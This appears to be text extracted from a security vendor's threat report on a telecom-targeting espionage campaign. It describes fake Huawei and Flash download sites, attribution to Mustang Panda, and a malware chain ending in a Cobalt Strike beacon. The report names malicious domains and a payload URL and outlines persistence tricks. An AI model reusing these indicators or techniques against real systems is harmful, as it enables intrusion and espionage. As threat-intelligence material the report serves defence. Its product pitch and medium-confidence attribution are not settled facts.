REPORT

Introduction

Authors

In this report the McAfee® Advanced Threat Research (ATR) Strategic Intelligence team details
an espionage campaign, targeting telecommunication companies, dubbed Operation Diànxùn.

This report was researched
and written by:

In this attack, we discovered malware using similar tactics, techniques, and procedures (TTPs)
to those observed in earlier campaigns publicly attributed to the threat actors RedDelta and
Mustang Panda. While the initial vector for the infection is not entirely clear, we believe with
a medium level of confidence that victims were lured to a domain under control of the threat
actor, from which they were infected with malware which the threat actor leveraged to perform
additional discovery and data collection. We believe with a medium level of confidence that
the attackers used a phishing website masquerading as the Huawei company career page to
target people working in the telecommunications industry.

We discovered malware that masqueraded as Flash applications, often connecting to the domain
“hxxp://update.careerhuawei.net” that was under control of the threat actor. The malicious
domain was crafted to look like the legitimate career site for the technology company Huawei,
which has the domain; career.huawei.com. In December we also observed a new domain name
used in this campaign: hxxp://update.huaweiyuncdn.com.
Moreover, the sample masquerading as the Flash application used the malicious domain name
“hxxp://flach.cn” which was made to look like the official web page for China to download the
Flash application, flash.cn. One of the main differences from past attacks is the lack of use of
the PlugX backdoor. However, we did identify the use of a Cobalt Strike backdoor.

Technical Analysis of Operation Diànxùn

REPORT

By using McAfee’s telemetry, possible targets based in Southeast Asia, Europe, and the US were
discovered in the telecommunication sector. Combined with the use of the fake Huawei site, we
believe with a high level of confidence that this campaign was targeting the telecommunication
sector. We believe with a moderate level of confidence that the motivation behind this specific
campaign has to do with the ban of Chinese technology in the global 5G roll-out.
Activity linked to the Chinese group RedDelta, by peers in our industry, has been spotted in
the wild since early May 2020. Previous attacks have been described targeting the Vatican and
religious organizations.
In September 2020, the group continued its activity using decoy documents related to
Catholicism, Tibet-Ladakh relations, and the United Nations General Assembly Security
Council, as well as other network intrusion activities targeting the Myanmar government and
two Hong Kong universities. These attacks mainly used the PlugX backdoor using DLL side
loading with legitimate software, such as Word or Acrobat, to compromise targets.
While external reports have given a new name to the group which attacked the religious
institutions, we believe, based on the similarity of TTPs, that both attacks can be attributed to
one known threat actor: Mustang Panda.
How can you defend your organization as effectively as possible from an attack of this type,
which involves different techniques and tactics and potential impact?

Technical Analysis of Operation Diànxùn

REPORT

We believe the best way to protect yourself from this type of attack is to adopt a multi-layer
approach including McAfee® MVISION™ Insights, McAfee® Web Gateway, MVISION™ UCE,
and MVISION™ EDR.
MVISION Insights can play a key role in risk mitigation by proactively collecting intelligence on
the threat and your exposure.
McAfee Web Gateway and MVISION UCE provide multi-layer web vector protection with URL
Reputation check, SSL decryption, and malware emulation capabilities for analyzing dangerous
active Web content such as Flash and DotNet. MVISION UCE also includes the capabilities
of Remote Browser Isolation, the only solution that can provide 100% protection during web
browsing.
McAfee® Endpoint Security (ENS) running on the target endpoint protects against Operation
Dianxun with an array of prevention and detection techniques. ENS Threat Prevention and
ATP provides both signature and behavioral analysis capability which proactively detects the
threat. ENS also leverages Global Threat Intelligence which is updated with known IoCs. For
DAT based detections, the family will be reported as Trojan-Cobalt, Trojan-FSYW, TrojanFSYX, Trojan-FSZC, and CobaltStr-FDWE.
As the last phase of the attack involves creating a backdoor for remote control of the victim via
a Command and Control Server and Cobalt Strike Beacon, the blocking features that can be
activated on a Next Generation Intrusion Prevention System solution such as McAfee NSP are
important, NSP includes a Callback Detection engine and is able to detect and block anomalies
in communication signals with C2 Servers.
MVISION EDR can proactively identify persistence and defense evasion techniques. You can
also use MVISION EDR to search the indicators of compromise in Real-Time or Historically (up
to 90 days) across enterprise systems.

Victimology

Attack Overview

Based on the detections we have identified via our telemetry, the use
of a fake website made to look like the career site of a major technology
company and the operating method showing extensive overlap to the
threat group Mustang Panda, we believe with a high level of confidence
that this cyberespionage campaign was targeting the telecommunications
sector. Several of these companies have shown a strong interest in the roll
out of 5G technology.

It is possible that the fake Huawei website “hxxp:\\update.careerhuawei.
net” has been used as an initial vector to trick targets and redirect them to
the fake Flash website.
The following diagram shows an overview of the infection process.

To put things in perspective, the 5G race is primarily about leading on
5G installation and thus communication worldwide. Huawei, the Chinese
company, is currently one of the leaders in this field.

Telemetry
We have observed telemetry hits in several countries across the globe. The
map below shows an overview of the detection from our telemetry. Below
we will highlight some of the specific countries that had telemetry hits.

The first stage is masquerading as the Flash application. A phishing page
has been created using the exact same appearance as the original website.
As the website is masquerading as the official download page, we believe
that it has been used in a phishing attack. It is likely that the targeted users
have been redirected to this malicious website.

Technical Analysis of Operation Diànxùn

It checks if the 360tray.exe (360 AV) process is running.
It can re-download the first stage from hxxp://update.flach.cn/download.
php?raw=1.
It creates a scheduled task that will run cmd.exe /c with the previous
payload downloaded and create the registry key SOFTWARE\\
Microsoft\\Windows. NT\\CurrentVersion\\AppCompatFlags\\
TelemetryController\\Levint.
It can download a Cobalt Strike payload base64 encoded and stored on a
remote address. If this option is selected the payload will be copied in the
TEMP folder with the name FlashUpdate.exe.
It checks if the task “WpsUpdataTask_” is present and downloads
an additional utility from hxxp://159.138.84.217:81/c0c00c0c/
AddTaskPlanDllVerson.dll.
It checks if the task “FlashUpdate” is present in the system and, if not,
can create it.
It can add a WMI backdoor by creating a permanent filter in order to stay
persistent in the infected machine.
It has the possibility to inject a shellcode into the clipboard using this
technique: https://search.unprotect.it/technique/clipbrdwndclass/.

Technical Analysis of Operation Diànxùn

The main goal of this tool is to check if the file “flashupdate_exe” is
available in the temp folder (meaning the first stage has been successful).

Then it creates a scheduled task called “WpsUpdataTask_” to run the
sample in the infected machine.

REPORT

Stage 3: Cobalt Strike Payload
The fourth stage of the attack is a Cobalt Strike beacon payload. This
payload is downloaded with the DotNet utility from the address “mobile.
flach.cn”. The payload is a gzip file which is base64 encoded then
decompressed and injected.
The following screenshot, extracted from the DotNet utility, shows the
code used to decompress and execute the remote payload.

Conclusion
In this report we have brought to light a recent espionage operation
allegedly attributed to a Chinese APT group. Regarding the targeted sector
(telecoms), we believe that this campaign was used to access sensitive
data and to spy on companies related to 5G technology. Additionally, the
use of a fake Huawei website gives more clues about the telecom targets.
The announcement of the ban on Huawei in several countries could have
motivated the operation.

The operating methods were previously assigned to the Chinese groups
Red Delta and Mustang Panda. While we believe that the two actors could
be the same, based on similar techniques, tactics, and procedures, we
currently have no further evidence. Interestingly, the RedDelta group has
previously targeted Catholic organizations, while this campaign is primarily
focused on telecommunications.
